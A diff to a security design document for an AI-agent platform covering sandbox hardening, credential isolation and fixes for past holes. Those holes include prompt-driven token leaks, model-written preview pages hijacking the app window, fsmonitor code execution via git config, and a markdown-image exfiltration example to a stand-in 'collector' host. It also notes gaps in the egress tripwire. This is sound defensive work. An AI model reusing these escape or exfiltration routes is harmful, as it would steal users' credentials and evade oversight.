@@ -447,6 +447,9 @@ binary wrapped in:
    `deny default` profile, or on Windows the MXC process container (below).
 3. **Network egress block** (`denyNet`, **fail closed**): Seatbelt `(deny network*)`, the
    container's denied egress, or (Linux) a systemd user service restricted to `AF_UNIX`.
+   Network-on work on Linux runs in the same kind of unit restricted to
+   `AF_INET AF_INET6 AF_NETLINK` when that probe passes, so it cannot reach the D-Bus bus
+   (whose `StartTransientUnit` starts an unconfined process) or the Docker socket.
    The JS `--import` preload also blocks fetch/WebSocket,
    net/dgram, callback + promise DNS, named built-in exports, and Resolver instances, but is
    defense-in-depth rather than a malicious-code boundary. Where no boundary applies the run
@@ -458,6 +461,32 @@ binary wrapped in:
 5. **Env scrub** — `sandboxEnv` allowlists only `PATH`/`HOME`/`NODE_*`/locale; strips
    `GEZEL_TOKEN`, `OPENAI_API_KEY`, etc. → a script **cannot read host secrets from
    `process.env`**.
+6. **What the permission model leaves open**, closed for every run where the Node binary
+   has the option (read from `node --help`): `--no-experimental-sqlite` (`node:sqlite`
+   opened, ATTACHed and VACUUMed INTO any path) and `--disable-sigusr1`. A preload replaces
+   `process._kill` and `process._debugProcess`, so a script signals only itself and opens no
+   other Node process's inspector; `process.binding` is refused under `--permission`, so the
+   originals are out of reach. Network-on runs also get a preload that refuses local-socket
+   and named-pipe connects (`net.Socket#connect` with a path): the permission model gates
+   neither, and `fs` cannot open a pipe there. Both preloads are defense in depth.
+7. **Links that lead out of the folder** — the permission model checks the path a script
+   names and the kernel follows any link on it, so a cloned repository's `r -> /` reached
+   anywhere. Where nothing confines the file system by real path (Linux, Windows without the
+   container) the run is refused when its folder holds a link that resolves outside the
+   granted roots, dangling links included (`sandbox/escaping-links.ts`, at most 500,000
+   entries, refused past that). A script cannot make such a link: `symlink`, `link` and
+   renames out are all refused under `--permission`.
+
+**The daemon's own inspector.** Any process of the account can open a Node process's
+inspector — SIGUSR1 on POSIX, `process._debugProcess(pid)` on Windows — and then run code in
+it. Every launcher Gezel owns starts `gezeld` with `--disable-sigusr1` (the client spawn the
+supervisor, CLI, VS Code and app SDK share, `gezel start --foreground`, the autostart units,
+the installed services, the Docker entrypoint; `DISABLE_DEBUG_SIGNAL_FLAG` in core
+`native/debug-signal.ts`). Electron ignores `execArgv` in a utility process, so the
+supervisor forks one with the flag in `NODE_OPTIONS` and clears it again before the service
+loads; the packaged main process relies on the `enableNodeCliInspectArguments` fuse. For
+hosts that pass nothing (an app embedding the service), `startService` takes SIGUSR1 with a
+listener on POSIX and warns on Windows, where no listener helps (`debug-signal-guard.ts`).
 
 **Windows: the MXC process container** (`sandbox/windows-mxc.ts`, `stdio-rpc.ts`;
 [ADR 0022](decisions/0022-windows-mxc-sandbox.md)). Microsoft's signed launcher
@@ -559,8 +588,22 @@ Three more layers keep credentials out of what an agent's own tools can reach at
   (`providers/agent-cli-env.ts`); Codex's shell additionally excludes `GEZEL_*`.
 - **Deny rules.** Claude's settings file denies `Read`/`Edit` of the credential files under
   the Gezel home (`anthropic-cli/credential-deny.ts`); a shell ignores those rules, which is
-  why the shell itself is gated. One-shot completions run with no built-ins, in `plan` mode,
-  in an empty folder.
+  why the shell itself is gated.
+- **One-shots run without tools.** A session built with no context (an about, a summary, a
+  script's `llm.oneShot`) runs Claude with no built-ins in `plan` mode and Codex in its
+  read-only sandbox with the shell off, each in an empty folder. Codex's had run in the
+  daemon's own folder with the install's mode and shell, so a prompt could have it print
+  `runtime/auth-token`. Whenever the shell is off, Codex also gets it as a `-c` flag, which
+  beats a `config.toml` and the person's own `-c`, and reaches a Codex that reads the person's
+  own config (`manageRuntimeFiles: false`).
+
+**Agent CLIs are never served to another app.** The `/v1` and Ollama surfaces, the Codex,
+OpenCode, pi and VS Code bridges, and Ollama emulation answer callers that hold an
+`openai`-scope token Gezel hands out without a code, or no token at all on the emulated Ollama
+port. They refuse a turn on `anthropic-cli` or `codex-cli`, named directly or through a gezel
+that runs on one (`openai-compat/caller-providers.ts`), and their model listings leave both out.
+A paired device's `/v1/remote/admit` and `/infer` run only the on-device engines `/models`
+lists: they had run whatever the model string named, including the host's cloud quota.
 
 **Package-command approvals are content-bound.** A persistent approval for
 `run_package_script` or `run_npx` hashes a versioned envelope containing the exact command
@@ -612,6 +655,17 @@ Deep dive: [secrets-security.md](secrets-security.md). Summary of the controls:
   project-owned and are re-read at session build without echoing their values through the API.
 - **Not exfiltratable by the model** — the outbound `fetch_url` screen refuses any request
   whose URL/headers/body contains a stored credential value (`collectProviderSecretValues`).
+  Text a gezel posts to GitHub (a PR comment, a PR's title and body) is refused for a stored
+  value or a secret-shaped string (`http/model-git-gate.ts`).
+- **A connector's credential serves only its connector** — a `script` connector's credential
+  sits in the project's grants so its fetch script can reach it parent-side, and a step script
+  that declared it could spend the person's token on anything at that origin. `http.authed`
+  now spends a `connector-*` credential only in that binding's own sync run
+  (`assertConnectorCredentialUse`, `scripts/dispatcher.ts`). Where a binding sends its
+  credential — a script type's `$config` origins, a native's `destinationKeys` (Bluesky's
+  server, a GitHub Enterprise or Azure API base, a wiki host) — changes only from the person's
+  own app (`isFirstPartyCaller`); the credential's origins follow that edit, and a sync adds
+  only the type's literal origins, never one read from config. Bluesky's server must be https.
 - **System-scope credential** — the daemon root token never leaves process memory. The
   discoverable runtime token is a separately minted `ui`/`openai` client credential. Every
   platform exposes only `runtime/` discovery metadata to local clients; all other machine
@@ -632,16 +686,28 @@ Deep dive: [secrets-security.md](secrets-security.md). Summary of the controls:
   bootstrap was externalized (`packages/ui/public/theme-init.js`) so `script-src 'self'` holds.
 - **Model-generated SVG icons** are sanitized (`icon/sanitize.ts`) before persist, but the CSP
   is the real guarantee — a regex SVG sanitizer is inherently best-effort.
-- **Navigation is locked down** — `will-navigate` pins the renderer to the daemon origin;
-  `setWindowOpenHandler` + `shell.openExternal` only accept an `https/http/mailto/tel`
-  allowlist (no `file://`, custom schemes, `javascript:`).
+- **Navigation is locked down** — the main frame only ever holds the app itself
+  (`isTrustedAppDocumentUrl`, `electron-boundaries.ts`): its routes on the daemon origin, or the
+  splash file. "Same origin" is not enough, because the daemon also serves model-written HTML
+  under `/preview/` (plus the Office pane and the APIs): a gezel once learned its page's preview
+  URL from page-check, linked it in chat, and one click made that page the main document, holding
+  the token. `will-navigate` cancels such a load without handing it to the system browser, and
+  `onBeforeRequest` cancels any main-frame request for one, redirects included. Paths are checked
+  percent-decoded, as the router reads them. `setWindowOpenHandler` + `shell.openExternal` only
+  accept an `https/http/mailto/tel` allowlist (no `file://`, custom schemes, `javascript:`).
 - **Cert pinning** — `session.setCertificateVerifyProc` accepts the custom loopback cert
   **only** for loopback hosts matching the current pin; all other origins defer to Chromium.
   Rotates with each daemon restart. It does **not** blanket-accept certs.
 - **Token to renderer** — surfaced via a synchronous `ipcMain` bridge + `window.__GEZEL__`.
   Any renderer XSS = token theft, which is exactly why the CSP/SVG/sandbox controls above
-  matter. The preload is minimal (per-channel `contextBridge`, no raw `ipcRenderer`/`fs`/
-  `shell`).
+  matter. The preload exposes about 45 functions through per-channel `contextBridge` calls (no
+  raw `ipcRenderer`/`fs`/`shell`), and runs in whatever document fills the main frame, so two
+  more layers sit behind the navigation lock. Every IPC channel registers through
+  `createTrustedIpc` (`trusted-ipc.ts`), which answers only the main window's main frame while it
+  shows the app (`isAppPageSender` in `main.ts`); a refused invoke rejects and a refused
+  synchronous message gets `null`. The preload itself exposes nothing in a non-app document.
+  Preview leases a gezel can read back are short: page-check revokes its lease when the run
+  ends, and preview-log entries reach the model with capabilities redacted.
 - **Bundle integrity** — the extracted service bundle's tarball is **sha256-verified against
   the shipped meta before extraction/execution** (`supervisor/extract-bundle.ts`). (This is
   integrity/corruption protection; the tarball + meta ship together inside the signed app.)
@@ -659,6 +725,8 @@ Deep dive: [secrets-security.md](secrets-security.md). Summary of the controls:
   and verifies the result stays inside `base`.
 - `resolveInside(base, rel)` — the end-to-end helper: `safeJoin` + reserved-Windows-name
   reject + `realpathContained`. Throws `PathSafetyError`.
+- `assertNotGitControlPath(base, rel)` — refuses a path inside a `.git` folder, by name and on
+  the real path (§12).
 
 **Writes** use `resolveInside`. **Reads** were hardened to do the same (`safeResolveRead` in
 `fs/store.ts`) so a symlink planted inside a workspace (trivially, via a cloned repo) can't be
@@ -717,6 +785,28 @@ loads live, untrusted pages ([website-connector.md](./website-connector.md),
 The text-only fallback (`http-session.ts`) uses `assertPublicUrl` per redirect hop and
 inherits its DNS-rebinding caveat above.
 
+### 11.0.1 Clones, page checks and rendered messages
+
+At `lockdown` web services are off, but three paths reached the network anyway:
+
+- **`fetch_repo` / `fetch_diff`** checked only the scheme. `planModelClone`
+  (`git/model-clone-policy.ts`) now asks for model git (on at `lockdown`, the coding posture;
+  off at `super-lockdown`) and lets a known public git host (GitHub, GitLab, Bitbucket,
+  Codeberg, Gitea, SourceHut) through over https; any other host needs web services. Both pass
+  the egress tripwire and `assertPublicUrl`, git speaks https only, and a clone from a host that
+  is not known follows no redirect (the settings are written into the clone, so its later
+  fetches keep them). Clone, pull, fetch, push and sync on a linked repository, and GitHub
+  comments and pull requests, refuse a gezel where model git is off (`modelGitRefusal`).
+- **Page-check's Chromium** loads the preview URL, whose CSP blocks remote resources when web
+  services are off, but a CSP does not cover a meta refresh, WebRTC or DNS. Below `free` the
+  runner aborts every request outside the page's origin, points everything else at a proxy
+  that answers nothing, turns WebRTC's UDP and DNS prefetch off and blocks service workers
+  (`page-check/runner.ts`, tested against a real browser).
+- **The VS Code chat webview** allowed `img-src https:`, so a model's
+  `![](https://collector/p.gif?d=…)` was fetched as the message rendered. It now allows
+  `data:` and `blob:` like the app, and wraps the chat in squisq's
+  `LOCAL_ONLY_RESOURCE_POLICY`.
+
 ### 11.1 Egress tripwire on tool calls
 
 `packages/core/src/security/egress-indicators.ts` — `findEgressIndicators` /
@@ -734,7 +824,8 @@ report may still quote these hosts:
 
 - **Gezel's own sinks** read what actually runs: the `package.json` script body and arguments
   (`runPackageScript`), `run_npx` arguments, the Playwright script source, the
-  `run_nodejs_script` file and `derive_file` source, and every `fetch_url` redirect hop.
+  `run_nodejs_script` file and `derive_file` source, every `fetch_url` redirect hop, a clone's
+  address, and text a gezel posts to GitHub (its image proxy fetches whatever a comment embeds).
 - **`McpBridge.callToolRich`** reads all arguments of a call to a bridge that does not serve
   gezel-mcp — third-party toolsets, the Playwright browser, app-registered tools — since no
   Gezel sink stands behind them.
@@ -761,9 +852,36 @@ unsandboxed Copilot) are not covered; see §14.
   option allowlist — not a denylist, because git accepts abbreviated long options and has
   several file-writing or file-reading flags (`--output`, `--no-index`, `--contents`). Positional
   arguments may not be absolute or contain a `..` segment, since `git diff` turns into
-  `--no-index` for a path outside the work tree. Every run disables fsmonitor and hooks, and the
-  diff family forces `--no-ext-diff --no-textconv`, because repository config is workspace
-  content. Clean/smudge filters in that config are not disabled.
+  `--no-index` for a path outside the work tree.
+- **Every git the service runs ignores programs a repository's config names.** Repository config
+  is content: a cloned repo, a folder the person adds, or a planted `.git/config` can name an
+  fsmonitor, hooks, an external diff or a textconv driver, and git runs each one. The indexer
+  runs `git ls-files` in every workspace and in the shared library on its own, so a
+  gezel-written `core.fsmonitor` once ran as the daemon's account with no click. `runGit`
+  (`git/git.ts`) and `run_git` share `git/config-overrides.ts`: `core.fsmonitor=false` and an
+  empty `core.hooksPath` on every call, `--no-ext-diff --no-textconv` for diff/log/show. A
+  consequence: a commit made from Gezel skips the repository's pre-commit hooks. Clean/smudge
+  filters are not switched off (that needs each driver's name), so they rest on the next rule.
+- **Gezel never writes inside a `.git` folder.** `assertNotGitControlPath` (`safe-paths.ts`)
+  refuses a `.git` segment in any case, with a trailing dot or space or an NTFS stream suffix,
+  and again on the real path, so a link or the Windows short name `GIT~1` cannot stand in for
+  it. It guards the Store's workspace gate (every caller, the person and applied proposals
+  included), the shared library and artifacts (`resolveOwnedMutationPath`), diffpack drafting,
+  `extract_archive` (`.git` entries are left in the archive and counted), and app seeds.
+  `run_nodejs_script` and `derive_file` write through Node's permission model instead, so
+  `workspace/git-control-guard.ts` snapshots each `.git` at the workspace root and two levels
+  down (config, `config.worktree`, `commondir`, `info/attributes`, hooks, pointer files) and
+  puts it back after the run. The person's own editor can still read a change during the run.
+- **A reserved path is judged by the name the filesystem opens, not the name typed.** On an
+  NTFS volume that keeps 8.3 short names (the system drive, and so `~/.gezel`, by default)
+  `DIFFPA~1/12/files/01.diff` wrote into a sealed proposal and `_META~1.JSO` into a corpus's
+  bookkeeping while every predicate saw an ordinary folder. The artifacts store runs one rule
+  table (`artifactMutationDenial`) on the given path and again on its native `realpath`, which
+  answers with long names and follows links, for writes, mkdirs, deletes and both ends of a
+  rename; a gezel's short-name-shaped segment is refused outright, for volumes whose `realpath`
+  keeps the spelling. The package-script gate and DocBlocks' `save_artifact` check the same
+  way. A sealed diff's sha256 lives in `diffpacks.json`, outside the drawer, and apply and
+  export refuse a sidecar that no longer matches, whatever guard failed.
 - **`run_playwright_script`** runs outside the script sandbox. The security level strips it
   whenever external services are off (it is open-web egress, like `fetch_url`), and the route
   refuses it the same way. A run a gezel asks for needs the user's approval of that exact
@@ -878,11 +996,18 @@ privileged service identity or putting the daemon root token on disk.
 | Per-credential host binding for `http.authed` | DEFERRED | Today: https + `redirect:'manual'`; a granted script can still POST a credential to any public host it names. Needs a grant-schema decision (e.g. GitHub Enterprise custom hosts). |
 | `secrets.key` co-located with `secrets.enc` | DEFERRED | Same-dir, same `0600`; encryption ≈ file perms. Fix = bind the key to an OS keychain / machine-id KDF / passphrase. Treat `secrets.enc` as plaintext-equivalent for backup/sync purposes. |
 | Machine-shared client membership | PRODUCT CHOICE | Every local account that can read the shared runtime credential is a trusted first-party Gezel client and can access shared daemon data. A future installer choice should make shared-machine versus per-user/private hosting explicit. |
+| Machine-shared projects and crew | ENFORCED | The shared root is writable by every local account, so a shared `project.json`, `gezel.md` or task file is another account's text. The Store ignores and refuses a shared project's folder, links, GitHub link, connections, credential grants and agent permissions, and a shared gezel's sandbox and permission overrides; nothing starts there unattended (`projectAllowsUnattendedWork`); a task's CLI trust stamp grants nothing. Content (workspace, memory, task text) is still read as collaborative text. See [service-boundaries.md](service-boundaries.md#machine-wide-projects-and-gezels). |
 | Broker LAN-serving administration via `machine-models` | PRODUCT CHOICE | The broker's `/v1/remote/manage/serving` surface (enable LAN serving, show a connect code, approve/deny device pairings, revoke devices) is authorized by the same shared runtime credential — until installer membership exists, any local account can administer LAN serving for the machine. The scope stays never-grantable via `/v1/apps/register`, so LAN peers can never obtain it. |
 | Remote product UI/API access | INTERIM — tunnel recipe | The product `/api` + web UI stay loopback-only by three independent layers (bind, host guard, cert/auth). The supported interim is a loopback-preserving tunnel (SSH `-L` / Tailscale toward loopback) with the schema-declared `service:{url,token}` supervisor mode; first-class remote access is designed in `docs/remote-access.md` and gated on the accounts ADR (0004). |
 | External user working directories from a machine daemon | NEEDS BROKER/GRANT | Dedicated service identities cannot safely inherit arbitrary user-profile access. Add an explicit ACL grant or user-context broker when linking such a folder; do not restore a privileged daemon identity. |
 | `denyNet` execution without an OS boundary | FAIL CLOSED | Windows runs it in the MXC container when the probe passes; Linux runs it under a systemd user unit when the probe passes, carrying script RPC over stdio. Elsewhere (Windows with the container off or unavailable, Linux without a usable systemd user manager) model/gate scripts return exit 126. Restore execution only with a real OS sandbox, not a JavaScript-only shim. |
+| Network-on execution without an OS boundary | PARTIAL | Spectral components, and model scripts at `free` where no denyNet boundary exists, run with the network. On Linux without a usable systemd user manager (a container, a server with no session) and on Windows without the container, only the Node layers above stand between them and the account: the permission model, the hardening options and preloads, and the link check. The Spectral origin guard is JavaScript-only and a component can step around it (`_http_client`, `WebSocket`, its own dispatcher). Next: Landlock and signal scoping in `gezel-sandbox`, and Spectral egress through a daemon filter proxy. |
+| File-system boundary on Linux | PARTIAL | No OS layer confines files on Linux; the systemd unit restricts address families only. The link check refuses a link that leads out now, but a script can move a directory holding a relative link so that it leads out afterwards, and a hard link to an outside file (a package store's) is written through. Landlock in `gezel-sandbox` is the fix. |
 | SSRF connect-time IP pin | DEFERRED | Current guard validates at DNS-resolution time (rebinding-window residual). |
+| Agent CLIs behind caller-owned surfaces | ENFORCED | The `/v1`, Ollama and bridge surfaces refuse `anthropic-cli` and `codex-cli`, directly or through a gezel on one, and leave them out of their listings; a paired device reaches only on-device engines (§7.1). |
+| Connector credentials and destinations | ENFORCED | A `connector-*` credential serves only its own binding's sync run; a destination field changes only from the person's app, and a sync never widens a credential's origins (§8). |
+| Unattended connector sends and posts | ENFORCED | A consent scope such as `allowPublish` is a standing permission on the connection, not a question per post. A commit transmits only when the person pressed Approve or the committing gezel runs a turn the person started (`isUserDirectedTurn`); a scheduled task by day, the night shift, a nudge or another gezel's request holds in the outbox (`held-for-approval`). A lookout's own recipients and mailbox drafts are the exceptions. Within a turn the person started, a gezel that read hostile content can still post without a further click. See [connectors.md](connectors.md#write-back-and-the-morning-briefing). |
+| Gezel posts to GitHub at `lockdown` | PRODUCT CHOICE | Lockdown keeps GitHub read and write for gezels, so after a turn reads a hostile pull request a gezel can still post ordinary text as a comment: the screen stops stored credentials, secret-shaped strings and tripwire addresses, not private code or prose. The fix is a per-project "may post to GitHub" switch or an approval for a post that follows untrusted content. |
 | Egress tripwire coverage (§11.1) | PARTIAL | Lexical and easy to evade on purpose: it targets trained-in habits, not an adversary. Provider-native shells (Claude CLI, Codex CLI, an unsandboxed Copilot) and MCP toolsets those providers call directly never pass the bridge, so their calls are not read. The next layer is a Gezel-owned egress proxy that logs and filters the connections themselves. |
 | Package-script edits by sandboxed scripts | PARTIAL | `run_nodejs_script` / `derive_file` write through Node's permission model, not the Store, so only the workspace's root manifests are snapshotted and put back. A nested workspace package's `scripts` can still change that way while `allowPackageScriptEdits` is off. |
 | URL, Git, local-file, workspace, and alias NPM sources | NOT SUPPORTED | The generic install surfaces intentionally accept registry packages only. If alternate sources become necessary, add a separate explicit consent-gated API with source-specific validation and SSRF controls; do not widen the registry-package parser. |
